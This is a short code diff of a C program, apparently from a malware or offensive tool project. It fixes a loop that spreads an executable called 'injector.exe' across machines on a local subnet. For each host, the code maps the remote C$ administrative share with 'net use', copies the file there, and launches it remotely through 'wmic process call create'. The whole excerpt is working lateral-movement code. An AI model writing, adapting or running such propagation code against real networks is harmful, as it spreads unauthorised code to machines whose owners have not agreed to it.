@@ -67,13 +67,24 @@ for (DWORD i = 0; i < entriesread; i++)
 //char *hostip = "192.168.255.";
 	int i;
 	char host[20];
+	char netuser[100];
+	char copyfile[100];
+	char wmicrun[100];
+	
 	for (i = 17; i < 22; i += 4)
 	{
 		snprintf(host, sizeof(host), "192.168.255.%d", i);
 		printf("%s\n", host);
-	    system("net use F: \\\\192.168.255.%d\\C$\\users\\saurav\\Downloads /user:saurav", i);
+		snprintf(netuser, sizeof(netuser),"net use F: \\\\192.168.255.%d\\C$\\users\\saurav\\Downloads /user:saurav", i );
+		system(netuser);
 		system("copy c:\\users\\saurav\\Downloads\\injector.exe f:");
-        system("wmic /node:@'192.168.255.%d' process call create '\\\\192.168.255.%d\\c$\\Users\\saurav\\Downloads\\injector.exe'", i);
+		//snprintf(copyfile, sizeof(copyfile), );
+		snprintf(wmicrun, sizeof(wmicrun), "wmic /node:192.168.255.%d process call create '\\\\192.168.255.%d\\c$\\Users\\saurav\\Downloads\\injector.exe'", i, i );
+		system(wmicrun);
+		
+	    //system("net use F: \\\\192.168.255.%d\\C$\\users\\saurav\\Downloads /user:saurav", i);
+		
+        //system("wmic /node:@'192.168.255.%d' process call create '\\\\192.168.255.%d\\c$\\Users\\saurav\\Downloads\\injector.exe'", i);
 	}
 
 
